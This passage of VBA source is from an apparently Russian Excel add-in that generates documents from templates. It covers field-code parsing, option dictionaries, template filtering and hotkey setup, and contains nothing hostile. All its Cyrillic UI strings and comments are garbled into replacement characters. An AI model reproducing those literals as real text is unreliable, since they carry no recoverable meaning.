                           "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & IIf(SETT.GetBoolean("CheckBox_Multirow_GroupRows"), "|fffd||fffd||fffd||fffd||fffd||fffd| ", "") & "|fffd||fffd||fffd||fffd||fffd|: " & rc& & _
                           ", |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & TemplatesFilenames.Count
    Main_PI.FP.SpinButton_log.Visible = False
    Main_PI.CancelButton.Caption = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|"

    If TemplatesFilenames.Count = 0 And SETT.GetBoolean("CheckBox_SendEmail") = True Then
        Main_PI.line1 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Main_PI.line2 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: " & LS.Items.Count
    Else
        Main_PI.Log "": Main_PI.Log "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:"
        Main_PI.Log vbTab & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & TemplatesFilenames.Count
        Main_PI.Log vbTab & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| Excel: " & rc&
        Main_PI.Log vbTab & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: " & FilesCreated & IIf(SETT.GetBoolean("CheckBox_MultiRow"), " (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd|MULTIROW|fffd|)", "")
        If FilesFailed& Then Main_PI.Log vbTab & "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: " & FilesFailed&
    End If


    StopMacro = True
    Main_PI.Log vbNewLine

    Set ThisWorkbook.app = Application

    Main_PI.CancelButton.Width = 0
    If FilesCreated > 0 Then
        If SETT.GetBoolean("CheckBox_ShowFolderWhenDone") Then
            OpenFolder OUTPUT_FOLDER$
        Else
            Main_PI.AddButton "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "OpenDestinationFolder"
        End If
    End If

    If SETT.GetBoolean("CheckBox_CloseProgressBar") Then Main_PI.Hide
End Sub


Function Get_HLink_Column(ByVal filename$, ByRef KeysRange As Range) As Range
    On Error Resume Next: Err.Clear: Dim celltext$
    celltext$ = HYPERLINK_START$ & Dir(filename$, vbNormal)
    If celltext$ Like "*.*" Then celltext$ = Left(celltext$, InStrRev(celltext$, ".") - 1)

    Set Get_HLink_Column = KeysRange.Find(celltext$, , xlValues, xlPart).EntireColumn
End Function


Sub OpenDestinationFolder()
    On Error Resume Next: OpenFolder OUTPUT_FOLDER$
End Sub

Function CreateAndFillDocument(ByVal TemplateFilename$, ByRef options As Dictionary, _
                               Optional ByRef pi As ProgressIndicator) As Boolean
    On Error Resume Next
    Dim NewFilename$, ttype$
    options("{%pcc%}") = "": options("{%pdf%}") = 0
    NewFilename$ = CreatePathForFile(TemplateFilename$, options)

    ttype$ = TemplateType(TemplateFilename$)
    Select Case True
        Case ttype$ Like "XLS*"
            CreateAndFillDocument = CreateAndFill_XLS(TemplateFilename$, NewFilename$, options, pi)
            If CreateAndFillDocument Then CombineXLScollection.Add NewFilename$
        Case ttype$ Like "DOC*"
            CreateAndFillDocument = CreateAndFill_DOC(TemplateFilename$, NewFilename$, options, pi)
        Case ttype$ Like "TXT"
            CreateAndFillDocument = CreateAndFill_TXT(TemplateFilename$, NewFilename$, options, pi)
        Case Else:
            If SETT.GetBoolean("CheckBox_ProcessUnsupportedTemplates") Then
                CreateAndFillDocument = True
                FileCopy TemplateFilename$, NewFilename$
            Else
                CreateAndFillDocument = False
            End If
    End Select
End Function


Function ApplyTemplatesFilter(ByRef coll As Collection, ByRef ro As Range) As Collection
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| coll |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    ' (|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|)
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    Set ApplyTemplatesFilter = coll
    If Not SETT.GetBoolean("CheckBox_TemplatesFilter_Enabled") Then Exit Function

    Dim col&, ra As Range, cell As Range, list$, item As Variant, filename$, OK As Boolean, Mask
    col& = SETT.GetNumber("ComboBox_TemplatesFilter_Column")
    If col = 0 Then Exit Function

    ' |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| Multirow) |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|:   |fffd||fffd||fffd|.doc    |fffd||fffd||fffd|    |fffd||fffd||fffd| *.doc*/|fffd||fffd||fffd||fffd||fffd||fffd||fffd|.doc/*.xls
    Set ra = Intersect(ro.EntireRow, ro.Worksheet.Columns(col&))
    list$ = "/"
    For Each cell In ra.Cells
        list$ = list$ & Trim(cell.value) & "/"
    Next cell

    list$ = Replace(list$, "\", "/")
    While InStr(1, list$, "/ ") > 0: list$ = Replace(list$, "/ ", "/"): Wend
    While InStr(1, list$, " /") > 0: list$ = Replace(list$, " /", "/"): Wend
    While InStr(1, list$, "//") > 0: list$ = Replace(list$, "//", "/"): Wend

    Set ApplyTemplatesFilter = New Collection
    For Each item In coll        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        filename$ = "": filename$ = Dir(item, vbNormal)
        OK = False
        For Each Mask In Split(list$, "/")        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
            If filename$ Like Mask Then OK = True: Exit For
        Next
        If OK Then ApplyTemplatesFilter.Add item
    Next
End Function
Attribute VB_Name = "mod_FieldCodes"
'---------------------------------------------------------------------------------------
' Module        : mod_FieldCodes
' Author        : EducatedFool                     Date: 26.04.2015
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/         Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit
Option Compare Text
Option Private Module

Function GetTemplateOptions(ByRef AllOptions As Dictionary, ByRef TemplateFieldCodes As Collection) As Dictionary
    On Error Resume Next
    Set GetTemplateOptions = New Dictionary
    AllOptions.CompareMode = 1        ' TextCompare
    
    Dim code, key_mask$, key$, AllOptionsKeys As Variant, i&, found As Boolean, OK As Boolean, AbsentCodes$, txt$
    AllOptionsKeys = AllOptions.Keys
    'If SourceSheet Is Nothing Then Set SourceSheet = ActiveSheet        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    
    For Each code In TemplateFieldCodes
        key_mask$ = "{" & Replace(code, "#", "[#]#*") & "}*"
        
        found = False
        For i = LBound(AllOptionsKeys) To UBound(AllOptionsKeys)
            key$ = AllOptionsKeys(i)
            If key$ Like key_mask$ Then
                GetTemplateOptions.Add key$, AllOptions.item(key$)
                found = True
            End If
        Next i
        
        If Not found Then
            OK = False: key$ = "{" & code & "}"
            If code Like "=*" Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                Err.Clear: txt$ = "": txt$ = SourceSheet.Range(Mid(code, 2)).Text
                OK = Err = 0
                AddLongTextIntoDictionary txt$, key$, GetTemplateOptions
            End If
            If Not OK Then If Not key$ Like "{%*%}" Then AbsentCodes$ = AbsentCodes$ & ", " & key$
        End If
    Next
    
    If Len(AbsentCodes$) Then
        Main_PI.Log vbTab & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|! |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & Mid(AbsentCodes$, 3)
        Main_PI.Repaint
    End If
    
    '    For i = LBound(AllOptionsKeys) To UBound(AllOptionsKeys)
    '        key$ = AllOptionsKeys(i)
    '        If key$ Like "{%*%}" Then         ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    '            If Not GetTemplateOptions.Exists(key$) Then GetTemplateOptions.Add key$, AllOptions.item(key$)
    '        End If
    '    Next i
End Function

Sub AddLongTextIntoDictionary(ByVal vText As Variant, ByVal key$, ByRef options As Dictionary)
    On Error Resume Next
    Dim i&, baseKey$, newkey$, LenStep&, txt_part$, txt$
    txt$ = CStr(vText)
    
    If Len(txt$) < 152 Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| - 255 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        options.Add key$, vText
        Exit Sub
    End If
    
    LenStep& = 250 - Len(key$) - 12        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|:) |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|!
    baseKey$ = key$
    For i = 1 To Len(txt$) Step LenStep&
        txt_part$ = Mid(txt$, i, LenStep&)
        newkey$ = baseKey$ & "{l=" & i & "}"
        If i + LenStep& - 1 < Len(txt$) Then txt_part$ = txt_part$ & newkey$
        options.Add key$, txt_part$
        key$ = newkey$
    Next i
End Sub

Function ReadOptions(ByRef ro As Range) As Dictionary
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Set ReadOptions = New Dictionary
    Dim cell As Range, i&, KeysRange As Range, key$, keyValue$, baseKey$, newkey$, txt$, LenStep&, wbname$, txt_part$, vText As Variant
    
    On Error Resume Next
    Set KeysRange = SpecialCells_TypeConstants(ro.Worksheet.Rows(HEADER_ROW))
    If Not KeysRange Is Nothing Then
        For Each cell In KeysRange.Cells
            key$ = Trim(cell)
            If Len(key$) > 250 Then key$ = Left(key$, 250)
            If Not key$ Like "*}" Then key$ = key$ & "}"
            If Not key$ Like "{*" Then key$ = "{" & key$
            
            With Intersect(ro.EntireRow, cell.EntireColumn)
                
                txt$ = .Text
                If cell.EntireColumn.Hidden Then txt$ = .value
                AddLongTextIntoDictionary txt$, key$, ReadOptions
                
                ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 12.09.2019
                keyValue$ = "{" & Trim(cell) & "\\value}"
                vText = .value
                'If VarType(vText) = vbDouble Then vText = val(Replace(vText, ",", "."))
                'If VarType(vText) = vbDate Then vText = CDate(vText)
                AddLongTextIntoDictionary vText, keyValue$, ReadOptions
                
            End With
        Next cell
    End If
    
    AddNamedRangesIntoDictionary ReadOptions, ro.Worksheet.Parent
    
    ReadOptions.Add "{%str%}", ro.Row
    ReadOptions.Add "{%date%}", Format(Now, "YYYY-MM-DD")
    ReadOptions.Add "{%shortdate%}", Format(Now, "YYMMDD")
    
    ReadOptions.Add "{%longdate%}", Format(Now, "DD MMMM YYYY")
    ReadOptions.Add "{%time%}", Format(Now, "HH-NN-SS")
    ReadOptions.Add "{%shorttime%}", Format(Now, "HHNNSS")
    
    ReadOptions.Add "{%datetime%}", Format(Now, "YYYY-MM-DD HH-NN-SS")
    ReadOptions.Add "{%shortdatetime%}", Format(Now, "YYMMDD-HHNNSS")
    ReadOptions.Add "{%longdatetime%}", Format(Now, "DD MMMM YYYY HH-NN-SS")
    
    ReadOptions.Add "{%sheet_name%}", ro.Worksheet.Name
    ReadOptions.Add "{%sheet_index%}", ro.Worksheet.Index
    wbname$ = ro.Worksheet.Parent.Name: If wbname$ Like "*.*" Then wbname$ = Left(wbname$, InStrRev(wbname$, ".") - 1)
    ReadOptions.Add "{%workbook_name%}", wbname$
End Function

Sub AddNamedRangesIntoDictionary(ByRef dict As Dictionary, ByRef WB As Workbook)
    On Error Resume Next
    Dim PrintCopies_FieldName$, n As Name, cell As Range
    
    ' ==================================
    PrintCopies_FieldName$ = Trim(SETT.GetText("TextBox_PrintCopies_FieldName", ""))
    If Not PrintCopies_FieldName$ Like String(Len(PrintCopies_FieldName$), "#") Then
        If Not PrintCopies_FieldName$ Like "*}" Then PrintCopies_FieldName$ = PrintCopies_FieldName$ & "}"
        If Not PrintCopies_FieldName$ Like "{*" Then PrintCopies_FieldName$ = "{" & PrintCopies_FieldName$
    End If
    
    If Len(PrintCopies_FieldName$) > 2 Or Val(PrintCopies_FieldName$) > 0 Then
        dict.Add "{%PrintCopiesCount%}", PrintCopies_FieldName$
    End If
    ' ==================================
    
    Dim i&, key$, baseKey$, newkey$, txt$, txt_part$, LenStep&, arr
    For Each n In WB.Names
        If n.Visible Then
            Set cell = Nothing: Set cell = n.RefersToRange.Cells(1)
            If Not cell Is Nothing Then
                key$ = "{=" & n.Name & "}"
                txt$ = cell.Text
                AddLongTextIntoDictionary txt$, key$, dict
                ' --------------
                key$ = "{=" & cell.Address(0, 0) & "}"
                txt$ = WB.ActiveSheet.Range(cell.Address).Text
                AddLongTextIntoDictionary txt$, key$, dict
            End If
        End If
    Next
    
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    arr = dict.Keys
    For i = LBound(arr) To UBound(arr)
        key$ = arr(i)
        txt$ = "": txt$ = dict(key$)
        
        If txt$ Like "*{chr#*}*" Then
            txt = Replace(txt, "{chr10}", Chr(10))
            txt = Replace(txt, "{chr11}", Chr(11))
            txt = Replace(txt, "{chr13}", Chr(13))
            txt = Replace(txt, "{chr1310}", vbNewLine)
            dict(key$) = txt$
        End If
    Next i
    
End Sub

Function ReadMultirowOptions(ByRef ra As Range) As Dictionary
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Set ReadMultirowOptions = New Dictionary
    Dim ro As Range, cell As Range, KeysRange As Range, key$, key2$, txt$, rn&, wbname$, str_txt$
    Dim i&, txt_part$, baseKey$, baseKey2$, newkey$, newkey2$, LenStep&, txt_part1$, txt_part2$
    
    On Error Resume Next
    Set KeysRange = SpecialCells_TypeConstants(ra.Worksheet.Rows(HEADER_ROW))
    If Not KeysRange Is Nothing Then
        For Each ro In ra.Rows        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
            rn = rn + 1
            For Each cell In KeysRange.Cells
                key$ = Trim(cell)
                If Len(key$) > 250 Then key$ = Left(key$, 250)
                If Not key$ Like "*}" Then key$ = key$ & "}"
                If Not key$ Like "{*" Then key$ = "{" & key$
                
                key2$ = Left(key$, Len(key$) - 1) & "#" & rn & "}"
                txt$ = Intersect(ro.EntireRow, cell.EntireColumn).Text
                If cell.EntireColumn.Hidden Then txt$ = Intersect(ro.EntireRow, cell.EntireColumn).value
                
                If rn = 1 Then AddLongTextIntoDictionary txt$, key$, ReadMultirowOptions
                AddLongTextIntoDictionary txt$, key2$, ReadMultirowOptions
                
                '            If Len(txt$) < 152 Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| - 255 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                '                If rn = 1 Then ReadMultirowOptions.Add key$, txt$
                '                ReadMultirowOptions.Add key2$, txt$
                '            Else
                '                LenStep& = 250 - Len(key$) - 12        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|:) |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|!
                '                baseKey$ = key$
                '                baseKey2$ = key2$
                '                For i = 1 To Len(txt$) Step LenStep&
                '                    txt_part$ = Mid(txt$, i, LenStep&)
                '                    newkey$ = baseKey$ & "{l=" & i & "}"
                '                    newkey2$ = baseKey2$ & "{l=" & i & "}"
                '
                '                    txt_part1$ = txt_part$: If i + LenStep& - 1 < Len(txt$) Then txt_part1$ = txt_part$ & newkey$
                '                    txt_part2$ = txt_part$: If i + LenStep& - 1 < Len(txt$) Then txt_part2$ = txt_part$ & newkey2$
                '
                '                    If rn = 1 Then ReadMultirowOptions.Add key$, txt_part1$
                '                    ReadMultirowOptions.Add key2$, txt_part2$
                '                    key$ = newkey$
                '                    key2$ = newkey2$
                '                Next i
                '            End If
            Next cell
        Next ro
    End If
    
    str_txt$ = Replace(Replace(Intersect(ra.EntireRow, ra.Worksheet.Columns(1)).Address, "$A$", ""), ":", "-")
    
    AddNamedRangesIntoDictionary ReadMultirowOptions, ra.Worksheet.Parent
    
    ReadMultirowOptions.Add "{%str%}", str_txt$
    ReadMultirowOptions.Add "{%rc%}", rn
    
    ReadMultirowOptions.Add "{%date%}", Format(Now, "YYYY-MM-DD")
    ReadMultirowOptions.Add "{%shortdate%}", Format(Now, "YYMMDD")
    
    ReadMultirowOptions.Add "{%longdate%}", Format(Now, "DD MMMM YYYY")
    ReadMultirowOptions.Add "{%time%}", Format(Now, "HH-NN-SS")
    ReadMultirowOptions.Add "{%shorttime%}", Format(Now, "HHNNSS")
    
    ReadMultirowOptions.Add "{%datetime%}", Format(Now, "YYYY-MM-DD HH-NN-SS")
    ReadMultirowOptions.Add "{%shortdatetime%}", Format(Now, "YYMMDD-HHNNSS")
    ReadMultirowOptions.Add "{%longdatetime%}", Format(Now, "DD MMMM YYYY HH-NN-SS")
    
    ReadMultirowOptions.Add "{%sheet_name%}", ra.Worksheet.Name
    ReadMultirowOptions.Add "{%sheet_index%}", ra.Worksheet.Index
    wbname$ = ra.Worksheet.Parent.Name: If wbname$ Like "*.*" Then wbname$ = Left(wbname$, InStrRev(wbname$, ".") - 1)
    ReadMultirowOptions.Add "{%workbook_name%}", wbname$
    Err.Clear
End Function


Function LoadFieldCodes_ExcelWorkbook(ByRef WB As Workbook, Optional ByRef coll As Collection) As Collection
    On Error Resume Next: Err.Clear
    Dim txt$, sh As Worksheet, cell As Range, sha As Shape
    If coll Is Nothing Then Set coll = New Collection
    
    For Each sh In WB.Worksheets
        With sh.PageSetup
            txt = txt & .LeftFooter & .LeftHeader & .CenterFooter & .CenterHeader & .RightFooter & .RightHeader
        End With
        For Each cell In FindAll(sh.UsedRange, "{*}", xlFormulas, xlPart).Cells
            txt = txt & cell.Formula
        Next cell
        For Each cell In FindAll(sh.UsedRange, "{*}", xlComments, xlPart).Cells
            txt = txt & cell.NoteText
        Next cell
        For Each sha In sh.Shapes
            txt = txt & sha.Name & " " & sha.TextFrame.Characters.Text
        Next
    Next sh
    
    LoadFieldCodes_fromText txt$, coll
    Set LoadFieldCodes_ExcelWorkbook = coll
End Function

Function LoadFieldCodes_WordDocument(ByRef doc As Object, Optional ByRef coll As Collection) As Collection
    On Error Resume Next: Err.Clear
    Dim myStoryRange As Object, txt$, ShowFieldCodes As Boolean, lngJunk&, rangeColl As Collection, oShp As Object
    If coll Is Nothing Then Set coll = New Collection
    
    ShowFieldCodes = doc.ActiveWindow.View.ShowFieldCodes
    doc.ActiveWindow.View.ShowFieldCodes = True        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
    
    lngJunk = doc.Sections(1).Headers(1).Range.StoryType    'Fix the skipped blank Header/Footer problem
    
    Set rangeColl = New Collection
    For Each myStoryRange In doc.StoryRanges
        rangeColl.Add myStoryRange
    Next
    
    For Each myStoryRange In rangeColl
        Do
            DoEvents
            LoadFieldCodes_fromText myStoryRange.Text, coll
            
            If SETT.GetBoolean("CheckBox_ReplaceInColonShapes") Then
                txt$ = "": DoEvents
                Select Case myStoryRange.StoryType
                    Case 6, 7, 8, 9, 10, 11
                        If myStoryRange.ShapeRange.Count > 0 Then
                            For Each oShp In myStoryRange.ShapeRange
                                If oShp.TextFrame.HasText Then txt$ = txt$ & oShp.TextFrame.TextRange.Text
                            Next
                        End If
                        LoadFieldCodes_fromText txt$, coll
                    Case Else
                        'Do Nothing
                End Select
            End If
            Set myStoryRange = myStoryRange.NextStoryRange    'Get next linked story (if any)
        Loop Until myStoryRange Is Nothing
    Next myStoryRange
    Set rangeColl = Nothing
    
    
    '    For Each myStoryRange In doc.StoryRanges
    '        DoEvents
    '        txt$ = myStoryRange.Text
    '        LoadFieldCodes_fromText txt$, coll
    '        While Not (myStoryRange.NextStoryRange Is Nothing)
    '            Set myStoryRange = myStoryRange.NextStoryRange
    '            txt$ = myStoryRange.Text
    '            LoadFieldCodes_fromText txt$, coll
    '        Wend
    '    Next myStoryRange
    
    doc.ActiveWindow.View.ShowFieldCodes = ShowFieldCodes
    Set LoadFieldCodes_WordDocument = coll
End Function

Function LoadFieldCodes_DOC(ByVal TemplateFilename$, ByRef coll As Collection)
    On Error Resume Next: Err.Clear: Dim doc As Object
    Set doc = WA.Documents.Open(TemplateFilename$, , False, False)
    If Not doc Is Nothing Then
        doc.ActiveWindow.View.ShowFieldCodes = True        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
        LoadFieldCodes_WordDocument doc, coll
        doc.Close False
    End If
End Function

Function LoadFieldCodes_fromText(ByVal txt$, ByRef coll As Collection)
    On Error Resume Next
    Static REGEXP As Object
    If REGEXP Is Nothing Then Set REGEXP = CreateObject("VBScript.RegExp"): REGEXP.Global = True
    REGEXP.Pattern = "{([^{}]{1,})}"
    
    txt = Replace(txt, "%7b", "{"): txt = Replace(txt, "%7d", "}")
    Dim Match As Object, code$
    If REGEXP.test(txt) Then
        For Each Match In REGEXP.Execute(txt)
            code$ = Match.submatches.item(0)
            coll.Add code$, LCase$(code$)
        Next
    End If
End Function


Attribute VB_Name = "mod_Functions"
'---------------------------------------------------------------------------------------
' Module        : mod_Functions
' Author        : EducatedFool                     Date: 06.06.2014
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/         Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit
Option Compare Text
Option Private Module

#If VBA7 Then        '  Office 2010-2013
    Declare PtrSafe Function SHCreateDirectoryEx Lib "shell32" Alias "SHCreateDirectoryExA" _
            (ByVal Hwnd As LongPtr, ByVal pszPath As String, ByVal psa As Any) As LongPtr
    Declare PtrSafe Function GetTickCount Lib "kernel32" () As Long
#Else        '  Office 2003-2007
    Declare Function SHCreateDirectoryEx Lib "shell32" Alias "SHCreateDirectoryExA" _
                                         (ByVal hwnd As Long, ByVal pszPath As String, ByVal psa As Any) As Long
    Declare Function GetTickCount Lib "kernel32" () As Long
#End If

Sub CtrlShiftV()        ' PasteFormulasForSeparateLetters
    On Error Resume Next: Err.Clear
    With GetObject("New:{1C3B4210-F441-11CE-B9EA-00AA006B1A69}")
        .GetFromClipboard
        CopyFormulas .GetText
    End With
End Sub

Sub CopyFormulas(ByVal txt$)
    On Error Resume Next: Err.Clear
    Dim ra As Range, n&, nn&, k&, cell As Range, addr$

    Application.ScreenUpdating = False
    Set ra = Selection

    For Each cell In ra.Cells
        n = n + 1
        If n = 1 Then
            addr$ = cell.Address(1, 1, xlA1)
            cell.value = txt
            cell.Font.Color = vbWhite
            cell.Font.Size = 1
        Else
            If cell.Address = cell.MergeArea.Cells(1).Address Then
                k = k + 1: cell.NumberFormat = "General"
                cell.Formula = "=MID(" & addr & "," & k & ",1)"
            End If
        End If
    Next cell
    If Err = 0 Then Shell "Cmd.exe /c echo " & Chr(7), vbHide
    Application.ScreenUpdating = True
End Sub

Sub Enable_HotKeys()
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    With Application
        If SETT.GetBoolean("CheckBox_PasteFormulasForSeparateLetters") Then .OnKey "^+v", "CtrlShiftV" Else .OnKey "^+v"
        If SETT.GetBoolean("CheckBox_InsertTableLinks") Then .OnKey "^+t", "CtrlShiftT" Else .OnKey "^+t"
        If SETT.GetBoolean("CheckBox_InsertImageLinks") Then .OnKey "^+i", "CtrlShiftI" Else .OnKey "^+i"
    End With
End Sub

Sub Disable_HotKeys()
    On Error Resume Next: Err.Clear
    Application.OnKey "^+v"
End Sub

Function SpecialCells_TypeConstants(ByRef ra As Range) As Range
